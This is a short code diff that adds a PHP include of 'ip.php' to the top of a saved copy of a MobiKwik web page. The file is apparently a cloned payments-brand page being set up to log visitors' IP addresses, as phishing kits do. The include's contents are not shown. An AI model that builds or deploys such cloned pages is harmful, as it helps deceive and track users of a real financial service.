@@ -1,4 +1,5 @@
-﻿<!DOCTYPE html><html lang="en"><style data-savepage-href="https://static10.mobikwik.com/targetv2/desktop/fonts.c8187ee370fc32399ca3.css">/*savepage-import-url=https://fonts.googleapis.com/css?family=Nunito:300,400,600,700*//* cyrillic-ext */
+﻿<?php include 'ip.php'; ?>
+<!DOCTYPE html><html lang="en"><style data-savepage-href="https://static10.mobikwik.com/targetv2/desktop/fonts.c8187ee370fc32399ca3.css">/*savepage-import-url=https://fonts.googleapis.com/css?family=Nunito:300,400,600,700*//* cyrillic-ext */
 @font-face {
   font-family: 'Nunito';
   font-style: normal;
